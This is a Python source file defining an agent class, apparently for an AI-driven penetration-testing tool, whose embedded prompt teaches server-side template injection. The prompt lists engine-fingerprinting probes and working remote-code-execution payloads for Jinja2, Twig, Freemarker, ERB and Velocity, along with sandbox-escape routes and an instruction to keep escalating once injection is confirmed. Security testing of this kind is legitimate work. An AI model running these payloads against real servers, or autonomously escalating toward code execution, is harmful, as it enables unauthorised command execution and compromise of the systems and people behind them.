from core.base_agent import ReasoningAgent
from core.http_client import HTTPClient


class SSTIAgent(ReasoningAgent):
    VULN_TYPE = "SSTI"
    VULN_PROMPT = """
━━━ YOUR KNOWLEDGE BASE FOR SSTI ━━━

WHAT TELLS YOU A TEMPLATE ENGINE IS INVOLVED:
  Error messages mentioning Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble, Mako
  Responses that look like rendered templates
  Parameters named: template, name, greeting, message, content, subject, body
  Email sending features (often use templates)
  Report generation features
  Personalisation features ("Hello {name}")

WHAT DIFFERENT MATH PROBES TELL YOU:
  {{7*7}} returning 49         → Jinja2 (Python) or Twig (PHP)
  {{7*'7'}} returning 7777777  → Jinja2 specifically (Twig would return 49)
  {{7*'7'}} returning 49       → Twig specifically
  ${7*7} returning 49          → Freemarker (Java) or Groovy
  #{7*7} returning 49          → Thymeleaf (Java Spring)
  <%=7*7%> returning 49        → ERB (Ruby)
  *{7*7} returning 49          → Spring/Thymeleaf expression
  #set($x=7*7)${x} ret 49     → Velocity (Java)
  {7*7} returning 49           → Smarty (PHP) some versions

WHAT TELLS YOU IT IS JINJA2 (Python/Flask/Django):
  {{config}} leaks application configuration
  {{self}} reveals template object
  {{''.__class__}} starts the object graph traversal
  Error messages showing Python tracebacks
  Framework keywords: Flask, Django, Werkzeug in error responses

WHAT TELLS YOU IT IS TWIG (PHP):
  {{_self}} reveals the Twig environment
  Error messages mentioning Twig or PHP
  {{dump()}} may work if debug mode on

WHAT TELLS YOU IT IS FREEMARKER (Java):
  ${product.class.forName()} style expressions
  Java exception traces in errors
  Expressions like ?api_builtin, ?new()

WHAT RCE LOOKS LIKE IN EACH ENGINE:

  Jinja2:
    Start: {{''.__class__.__mro__}}
    Find subclasses: {{''.__class__.__mro__[1].__subclasses__()}}
    The exact index of subprocess.Popen or os._wrap_close varies by Python version
    Alternative: {{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
    Alternative via cycler: {{cycler.__init__.__globals__.os.popen('id').read()}}
    Alternative via lipsum: {{lipsum.__globals__['os'].popen('id').read()}}

  Twig:
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
    Or: {{['id']|map('system')|join}}

  Freemarker:
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

  ERB (Ruby):
    <%=`id`%> or <%=system("id")%>

  Velocity:
    #set($rt=$class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))

WHAT SANDBOX ESCAPE LOOKS LIKE:
  If direct __class__ traversal is blocked, try alternate entry points:
  lipsum, cycler, joiner, namespace globals in Jinja2
  Different base objects that reach os.system through different paths

SEVERITY REASONING:
  Any RCE via template injection → Critical
  SSTI confirmed, RCE path not yet found → High (escalate further)
"""

    def __init__(self, endpoint: dict, http: HTTPClient):
        super().__init__(endpoint, http)